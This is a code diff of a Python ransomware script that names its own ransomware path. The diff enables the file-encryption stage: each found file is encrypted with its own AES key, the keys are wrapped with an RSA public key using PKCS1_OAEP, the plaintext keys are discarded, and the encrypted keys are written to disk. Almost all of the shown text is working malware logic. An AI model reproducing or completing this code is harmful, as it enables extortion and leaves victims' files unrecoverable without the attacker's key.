@@ -70,11 +70,9 @@ def shred(file_name,  passes=1):
 
 
 def start_encryption(files):
-    AES_keys = []
     AES_and_base64_path = []
     for found_file in files:
         key = generate_keys.generate_key(32, True)
-        AES_keys.append(key)
         AES_obj = symmetric.AESCipher(key)
 
         with open(found_file, 'rb') as f:
@@ -137,28 +135,31 @@ def menu():
     
     # Get the client public key back as object
     client_public_key_object =  RSA.importKey(Client_public_key)
+    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)
+
 
     # FILE ENCRYPTION STARTS HERE !!!
-    # aes_keys_and_base64_path = start_encryption(files)
-    # enc_aes_key_and_base64_path = []
+    aes_keys_and_base64_path = start_encryption(files)
+    enc_aes_key_and_base64_path = []
 
-    # for _ in aes_keys_and_base64_path:
-    #     aes_key = _[0]
-    #     base64_path = _[1]
+    for _ in aes_keys_and_base64_path:
+        aes_key = _[0]
+        base64_path = _[1]
 
-    #     # encrypt with the client public key
-    #     encrypted_aes_key = client_public_key_object.encrypt(aes_key, 'x')[0]
-    #     enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
+        # encrypt with the client public key
+        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
+        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
     
-    # # free the old AES keys
-    # aes_keys_and_base64_path = None
-    # gc.collect()
+    # free the old AES keys
+    aes_keys_and_base64_path = None
+    gc.collect()
+    del aes_keys_and_base64_path
 
-    # # save to disk -> ENC(AES) BASE64(PATH)
-    # with open(ransomware_path + "/AES_encrypted_keys", 'w') as f:
-    #     for _ in enc_aes_key_and_base64_path:
-    #         line = _[0] + " " + _[1] + "\n"
-    #         f.write(line)
+    # save to disk -> ENC(AES) BASE64(PATH)
+    with open(ransomware_path + "/AES_encrypted_keys", 'w') as f:
+        for _ in enc_aes_key_and_base64_path:
+            line = _[0] + " " + _[1] + "\n"
+            f.write(line)
 
     # gc.collect()
     # # TODO
